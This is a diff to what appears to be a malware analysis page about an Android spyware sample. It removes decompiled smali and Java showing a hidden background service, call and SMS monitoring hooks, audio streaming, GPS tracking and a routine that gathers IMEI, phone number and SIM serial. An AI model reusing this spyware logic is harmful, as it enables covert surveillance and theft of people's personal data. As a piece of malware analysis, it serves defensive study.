@@ -252,180 +252,6 @@ android.provider.Telephony.SMS_RECEIVED      // RECEIVER FOR DEVICE SMS MONITORI
 android.intent.action.PHONE_STATE.           // RECEIVER FOR DEVICE PHONE CALL MONITORING
 </code>
 </pre>
-  
-<p><b>MainActivity SMALi:</b></p>
- 
-<pre style="background-color: #100E15; border: none !important;">
-<code class="language-smali">
-.class public Lcom/example/redacted/redacted/MainActivity;
-.super Landroid/app/Activity;
-.source "MainActivity.java"
-
-
-# direct methods
-.method public constructor <init>()V
-    .registers 3
-
-    .prologue
-    .line 22
-    move-object v0, p0
-
-    .local v0, "this":Lcom/example/redacted/redacted/MainActivity;
-    move-object v1, v0
-
-    invoke-direct {v1}, Landroid/app/Activity;-><init>()V
-
-    return-void
-.end method
-
-
-# virtual methods
-.method protected onCreate(Landroid/os/Bundle;)V
-    .registers 10
-
-    .prologue
-    .line 26
-    move-object v0, p0
-
-    .local v0, "this":Lcom/example/redacted/redacted/MainActivity;
-    move-object v1, p1
-
-    .local v1, "savedInstanceState":Landroid/os/Bundle;
-    move-object v2, v0
-
-    move-object v3, v1
-
-    invoke-super {v2, v3}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V
-
-    .line 27
-    move-object v2, v0
-
-    new-instance v3, Landroid/content/Intent;
-
-    move-object v7, v3
-
-    move-object v3, v7
-
-    move-object v4, v7
-
-    move-object v5, v0
-
-    invoke-virtual {v5}, Lcom/example/redacted/redacted/MainActivity;->getBaseContext()Landroid/content/Context;
-
-    move-result-object v5
-
-    const-class v6, Lcom/example/redacted/redacted/CMDService;
-
-    invoke-direct {v4, v5, v6}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
-
-    invoke-virtual {v2, v3}, Lcom/example/redacted/redacted/MainActivity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
-
-    move-result-object v2
-
-    .line 28
-    return-void
-.end method
-
-.method public onResume()V
-    .registers 9
-
-    .prologue
-    .line 42
-    move-object v0, p0
-
-    .local v0, "this":Lcom/example/redacted/redacted/MainActivity;
-    move-object v2, v0
-
-    :try_start_2
-    invoke-super {v2}, Landroid/app/Activity;->onResume()V
-
-    .line 43
-    move-object v2, v0
-
-    new-instance v3, Landroid/content/Intent;
-
-    move-object v7, v3
-
-    move-object v3, v7
-
-    move-object v4, v7
-
-    move-object v5, v0
-
-    invoke-virtual {v5}, Lcom/example/redacted/redacted/MainActivity;->getBaseContext()Landroid/content/Context;
-
-    move-result-object v5
-
-    const-class v6, Lcom/example/redacted/redacted/CMDService;
-
-    invoke-direct {v4, v5, v6}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
-
-    invoke-virtual {v2, v3}, Lcom/example/redacted/redacted/MainActivity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
-
-    move-result-object v2
-
-    .line 44
-    move-object v2, v0
-
-    const/4 v3, 0x1
-
-    invoke-virtual {v2, v3}, Lcom/example/redacted/redacted/MainActivity;->moveTaskToBack(Z)Z
-    :try_end_1e
-    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_1e} :catch_20
-
-    move-result v2
-
-    .line 45
-    .line 46
-    :goto_1f
-    return-void
-
-    .line 45
-    :catch_20
-    move-exception v2
-
-    move-object v1, v2
-
-    goto :goto_1f
-.end method
-
-.method public onStart()V
-    .registers 4
-
-    .prologue
-    .line 34
-    move-object v0, p0
-
-    .local v0, "this":Lcom/example/redacted/redacted/MainActivity;
-    move-object v2, v0
-
-    :try_start_2
-    invoke-super {v2}, Landroid/app/Activity;->onStart()V
-
-    .line 35
-    move-object v2, v0
-
-    invoke-virtual {v2}, Lcom/example/redacted/redacted/MainActivity;->onResume()V
-    :try_end_9
-    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_9} :catch_a
-
-    .line 36
-    .line 37
-    :goto_9
-    return-void
-
-    .line 36
-    :catch_a
-    move-exception v2
-
-    move-object v1, v2
-
-    goto :goto_9
-.end method
-
-[...]
-
-</code></pre>
     
     <p>After decompiling the sample's DEX (Dalvik bytecode), SMALi/baksmali to readable JAVA/Kotlin classes; the entry point, being, the <code>MainActivity</code> class defined by <code>android.intent.action.MAIN</code> is seen to contain an <code>onCreate()</code> method invoking another class, being <code>CMDService</code> class, of which, is also invoked via the <code>onResume()</code> and <code>onStart()</code> method within the same <code>MainActivity</code> class. The following represents the <code>onCreate()</code> method which is immediatley called by Android's javac/kotlinc compiler and executed on the JVM: 
       
@@ -466,10 +292,7 @@ android.intent.action.PHONE_STATE.           // RECEIVER FOR DEVICE PHONE CALL M
       if (this.callRec == null) {
         this.t_manager = ((android.telephony.TelephonyManager)this.getSystemService("phone"));
         Maybe([ARRAY, OBJECT]) v6_0 = new com.example.redacted.redacted.CMDService$1(v3_3);
-        Maybe([ARRAY, OBJECT]) v3_4 = v6_0;
-        v6_0.<init>(this);
-        this.p_listener = v3_4;
-        this.t_manager.listen(this.p_listener, 32);
+        [...]
       } else {
         this.callRec.stop();
       }
@@ -499,47 +322,7 @@ android.intent.action.PHONE_STATE.           // RECEIVER FOR DEVICE PHONE CALL M
       this.audio.stop();
     }
     Maybe([ARRAY, OBJECT]) v5_0 = new com.example.redacted.redacted.AudioStreamer(v3_0);
-    Maybe([ARRAY, OBJECT]) v3_1 = v5_0;
-    v5_0.<init>();
-    this.audio = v3_1;
-    this.audio.run();
-    return;
-  }
-
-  private org.json.JSONObject putInfo() {
-    try {
-      String v4_24;
-      android.content.Context v2_1 = this.ctx;
-      android.content.BroadcastReceiver v3_2 = this.info.batteryInfoReceiver;
-      Maybe([ARRAY, OBJECT]) v7_0 = new android.content.IntentFilter(v4_0);
-      Maybe([ARRAY, OBJECT]) v4_1 = v7_0;
-      v7_0.<init>("android.intent.action.BATTERY_CHANGED");
-      v2_1.registerReceiver(v3_2, v4_1);
-      Maybe([ARRAY, OBJECT]) v7_1 = new org.json.JSONObject(v2_2);
-      Maybe([ARRAY, OBJECT]) v2_3 = v7_1;
-      v7_1.<init>();
-      Maybe([ARRAY, OBJECT]) v1_0 = v2_3;
-      com.example.redacted.redacted.setting.os = this.info.androidInfo();
-      com.example.redacted.redacted.setting.ip = this.info.getIP();
-      com.example.redacted.redacted.setting.imi = this.info.getIMEI();
-      v1_0.put("CMD", "info");
-      v1_0.put("CountryCode", this.info.getCountryCode());
-      v1_0.put("name", this.info.getOperatorName());
-      v1_0.put("phoneNumber", this.info.getPhoneNumber());
-      v1_0.put("simCountryCode", this.info.getSimCountryCode());
-      v1_0.put("simSerial", this.info.getSimSerial());
-    } catch (Exception v2_20) {
-      Maybe([ARRAY, OBJECT]) v1_1 = v2_20;
-      if (com.example.redacted.redacted.setting.errors) {
-        android.content.Context v2_23 = this.getBaseContext();
-        Maybe([ARRAY, OBJECT]) v7_2 = new StringBuilder(v3_11);
-        Maybe([ARRAY, OBJECT]) v3_12 = v7_2;
-        v7_2.<init>();
-        android.widget.Toast.makeText(v2_23, v3_12.append("Exception: ").append(v1_1.getMessage()).toString(), 1).show();
-      }
-      Maybe([ARRAY, OBJECT]) v0_1 = 0;
-      return v0_1;
-    }
+    [...]
     if (!com.example.redacted.redacted.setting.isNetworkEnabled) {
       [...]
     String v4_26;
@@ -874,21 +657,7 @@ android.intent.action.PHONE_STATE.           // RECEIVER FOR DEVICE PHONE CALL M
     try {
       String v8_3;
       Maybe([ARRAY, OBJECT]) v11_0 = new com.example.redacted.redacted.GPSListener(v6_0);
-      Maybe([ARRAY, OBJECT]) v6_1 = v11_0;
-      v11_0.<init>(this.ctx);
-      Maybe([ARRAY, OBJECT]) v3_0 = v6_1;
-      v3_0.getStatus();
-      Maybe([ARRAY, OBJECT]) v11_1 = new org.json.JSONObject(v6_3);
-      Maybe([ARRAY, OBJECT]) v6_4 = v11_1;
-      v11_1.<init>();
-      Maybe([ARRAY, OBJECT]) v4_0 = v6_4;
-      Maybe([ARRAY, OBJECT]) v11_2 = new org.json.JSONArray(v6_5);
-      Maybe([ARRAY, OBJECT]) v6_6 = v11_2;
-      v11_2.<init>();
-      Maybe([ARRAY, OBJECT]) v5_0 = v6_6;
-    } catch (org.json.JSONException v6_8) {
-      v6_8.printStackTrace();
-      return;
+      [...]
     }
 </code>
 </pre>
